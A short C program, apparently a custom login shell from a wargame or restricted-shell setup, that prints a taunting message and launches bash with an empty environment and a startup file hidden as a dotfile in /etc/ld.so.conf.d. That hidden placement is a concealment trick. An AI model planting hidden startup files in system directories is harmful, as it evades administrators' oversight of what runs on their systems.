#include <stdio.h>
#include <unistd.h>

#define LOGIN_MSG "And there's a NoNo for him too!"

int main(void){
	char *args[4];
	args[0] = "/bin/bash";
	args[1] = "--rcfile";
	args[2] = "/etc/ld.so.conf.d/.bashrc";
	args[3] = NULL;
	printf("%s\n", LOGIN_MSG);
	execve(args[0], args, NULL);
}
